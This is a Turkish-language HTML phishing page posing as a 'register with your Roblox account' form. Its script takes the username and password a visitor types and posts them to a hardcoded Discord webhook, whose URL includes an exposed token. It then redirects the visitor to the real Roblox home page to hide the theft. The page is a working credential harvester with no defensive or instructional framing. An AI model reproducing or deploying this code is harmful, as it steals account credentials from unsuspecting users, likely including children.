<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Kayıt Ol</title>
</head>
<body>
  <h1>Roblox Hesabınızla Kayıt Olun</h1>
  <form id="register-form">
    <label for="username">Kullanıcı Adı:</label>
    <input type="text" id="username" name="username" required><br><br>

    <label for="password">Şifre:</label>
    <input type="password" id="password" name="password" required><br><br>

    <button type="submit">Kayıt Ol</button>
  </form>

  <script>
    document.getElementById('register-form').addEventListener('submit', function(event) {
      event.preventDefault();
      
      const username = document.getElementById('username').value;
      const password = document.getElementById('password').value;

      // Webhook ile Discord'a gönderme işlemi
      const webhookURL = 'https://canary.discord.com/api/webhooks/1313523578217566278/no2aSqXSwdOxZcK9qEPWjDXT5m3UY3cMIwmJG6524zQS3a7VlEG_LWATo4g30Wdn00ie'; // Discord webhook URL'nizi buraya ekleyin
      const data = {
        content: `Yeni Kayıt: Kullanıcı Adı: ${username}, Şifre: ${password}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(data)
      })
      .then(response => response.json())
      .then(() => {
        // Başarıyla gönderildiğinde, kullanıcıyı GitHub Pages ana sayfasına yönlendirme
        localStorage.setItem('userLoggedIn', 'true');
        window.location.href = 'https://roblox.com/home'; // Buraya istediğiniz yönlendirme URL'sini ekleyin
      })
      .catch(error => console.error('Webhook hatası:', error));
    });
  </script>
</body>
</html>
